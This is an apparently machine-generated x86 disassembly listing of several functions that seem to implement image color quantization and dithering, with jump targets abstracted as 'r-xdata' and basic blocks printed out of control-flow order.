jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x10 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov [ edx + 0x14 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x20 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x24 ]
cdq
idiv [ ebp - 0x1c ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx + 0x8 ]
add esp 0x10
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x1c ]
jge r-xdata
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov edx [ ebp - 0x1c ]
sub edx 0x1
push edx
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4296d0
add esp 0x10
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x14 ]
imul eax [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x28 ]
cmp edx [ ebp - 0xc ]
jge r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x20 ]
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x28 ]
add edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + eax * 4 ]
mov cl [ ebp - 0x2c ]
mov [ eax + edx ] cl
jmp r-xdata
mov ecx [ ebp - 0x28 ]
add ecx [ ebp - 0x24 ]
mov [ ebp - 0x28 ] ecx
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
sub_429550
push ebp
mov ebp esp
sub esp 0x64
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x54 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x4 ]
jge r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
mov edx [ ebp - 0x20 ]
imul edx [ ebp - 0x10 ]
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x10 ]
sub ecx 0x1
mov [ ebp - 0x10 ] ecx
cmp [ ebp - 0x10 ] 0x2
jge r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x38
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x20 ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x10 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0xc ]
imul eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0x1c ]
and ecx 0xff
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x2c ] 0x2
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x14 ]
mov edx [ ecx * 4 + r--data ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0xc ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0x18 ]
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
cdq
idiv [ esi + ecx * 4 ]
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x20 ]
imul edx ecx
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
sub_4296d0
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov ecx [ ebp + 0x10 ]
imul ecx ecx 0xff
mov eax [ ebp + 0x14 ]
cdq
sub eax edx
sar eax 0x1
add eax ecx
cdq
idiv [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429700
push ebp
mov ebp esp
sub esp 0x64
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x4c ] 0x1
jne r-xdata
mov [ ebp - 0x24 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x1c ] 0x0
mov [ ebp - 0x24 ] 0x1fe
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x64 ]
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
push eax
mov ecx [ ebp - 0x24 ]
add ecx 0x100
push ecx
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx + 0x8 ]
add esp 0x10
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x20 ]
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x1c ]
cdq
idiv [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0xc ]
mov ecx [ edx + eax * 4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x20 ] 0x0
mov edx [ ebp - 0x18 ]
sub edx 0x1
push edx
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4298b0
add esp 0x10
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp - 0xc ]
mov edx [ eax + ecx * 4 ]
add edx 0xff
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
mov [ ecx + eax * 4 ] edx
cmp [ ebp - 0x10 ] 0xff
jg r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x20 ]
imul eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x10 ]
mov [ ecx ] al
jmp r-xdata
mov ecx [ ebp - 0x18 ]
sub ecx 0x1
push ecx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4298b0
add esp 0x10
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
cmp [ ebp - 0x10 ] 0xff
jg r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
neg eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
mov [ ecx + eax ] dl
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov dl [ ecx + 0xff ]
mov [ eax + 0xff ] dl
jmp r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
sub_4298b0
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x10 ]
lea eax [ eax + eax + 0x1 ]
imul eax eax 0xff
add eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x1
cdq
idiv ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4298e0
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x5c ]
lea ecx [ eax + eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x64 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
push edx
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx + 0x4 ]
add esp 0xc
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x44 ] eax
jmp r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
sub_429950
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov [ edx + 0x74 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
mov [ edx + 0x70 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4c ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x64 ] 0x3
jne r-xdata
cmp [ ebp - 0x10 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_429c40
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_429d30
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x64 ] 0x3
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_429e40
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_429f90
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] sub_42a120
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x44 ] 0x0
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x34 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_429700
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x30 ] 0x0
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + 0x1c ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x5c ]
lea ecx [ eax + eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4298e0
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x30
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_429ab0
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x64 ]
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x44 ]
push edx
call sub_420d70
add esp 0x8
jmp r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
sub_429ab0
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x64 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x20 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
cmp eax [ edx + ecx * 4 + 0x20 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ ecx + eax * 4 + 0x34 ] edx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_429b70
add esp 0x8
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + ecx * 4 + 0x34 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
sub_429b70
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
push 0x400
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
sub eax 0x1
shl eax 0x9
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
cmp [ ebp - 0x8 ] 0x10
jge r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ ebp - 0xc ] 0x10
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov ecx [ ebp - 0xc ]
xor edx edx
mov dl [ eax + ecx + r--data ]
shl edx 0x1
mov eax 0xff
sub eax edx
imul eax eax 0xff
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x10 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
neg eax
cdq
idiv [ ebp - 0x14 ]
neg eax
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x8 ]
shl ecx 0x6
mov edx [ ebp - 0x4 ]
add edx ecx
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x18 ]
mov [ edx + eax * 4 ] ecx
jmp r-xdata
sub_429c40
push ebp
mov ebp esp
sub esp 0x68
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x5c ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ ebp + 0x14 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp + 0x10 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
jbe r-xdata
jmp r-xdata
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x1c ]
add edx 0x1
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0x28 ]
jge r-xdata
mov edx [ ebp - 0x18 ]
mov al [ ebp - 0xc ]
mov [ edx ] al
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx [ edx + ecx * 4 ]
xor edx edx
mov dl [ ecx + eax ]
mov eax [ ebp - 0xc ]
add eax edx
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov edx [ ebp - 0x20 ]
sub edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
sub_429d30
push ebp
mov ebp esp
sub esp 0x68
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov ecx [ eax ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x20 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x20 ]
cmp edx [ ebp + 0x14 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
jbe r-xdata
jmp r-xdata
mov edx [ ebp - 0xc ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx + eax ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cl [ eax + edx ]
mov edx [ ebp - 0x8 ]
add edx ecx
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x1c ]
xor ecx ecx
mov cl [ eax + edx ]
mov edx [ ebp - 0x8 ]
add edx ecx
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x10 ]
mov dl [ ebp - 0x8 ]
mov [ ecx ] dl
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov ecx [ ebp - 0x24 ]
sub ecx 0x1
mov [ ebp - 0x24 ] ecx
sub_429e40
push ebp
mov ebp esp
sub esp 0x70
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x5c ]
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x28 ]
cmp ecx [ ebp + 0x14 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x30 ]
push edx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ecx + eax * 4 ]
push edx
call sub_420d70
add esp 0x8
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x20 ]
jge r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
and ecx 0xf
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
mov [ edx + 0x30 ] eax
jmp r-xdata
mov ecx [ ebp - 0x28 ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 ]
add eax [ ebp - 0x24 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x28 ]
mov edx [ ebp + 0x10 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0x24 ]
mov ecx [ edx + eax * 4 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x18 ]
shl edx 0x6
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + eax * 4 + 0x34 ]
add eax edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x2c ] ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
add eax 0x1
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x2c ] 0x0
jbe r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
add ecx [ eax + edx * 4 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov dl [ edx ]
add dl [ eax + ecx ]
mov eax [ ebp - 0xc ]
mov [ eax ] dl
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x20 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x1c ]
add eax 0x1
and eax 0xf
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov edx [ ebp - 0x24 ]
add edx 0x1
mov [ ebp - 0x24 ] edx
mov edx [ ebp - 0x2c ]
sub edx 0x1
mov [ ebp - 0x2c ] edx
sub_429f90
push ebp
mov ebp esp
sub esp 0x7c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov ecx [ eax ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x5c ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x34 ]
cmp edx [ ebp + 0x14 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x34 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x34 ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x2c ]
shl edx 0x6
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
add ecx edx
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x2c ]
shl edx 0x6
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
add ecx edx
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x2c ]
shl edx 0x6
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
add ecx edx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x30 ] 0x0
mov edx [ ebp - 0x3c ]
mov [ ebp - 0x38 ] edx
jmp r-xdata
cmp [ ebp - 0x38 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x2c ]
add ecx 0x1
and ecx 0xf
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x2c ]
mov [ edx + 0x30 ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x20 ]
add edx [ ecx + eax * 4 ]
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax + edx ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x24 ]
add ecx [ eax + edx * 4 ]
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx + ecx ]
mov ecx [ ebp - 0x8 ]
add ecx eax
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
xor ecx ecx
mov cl [ eax ]
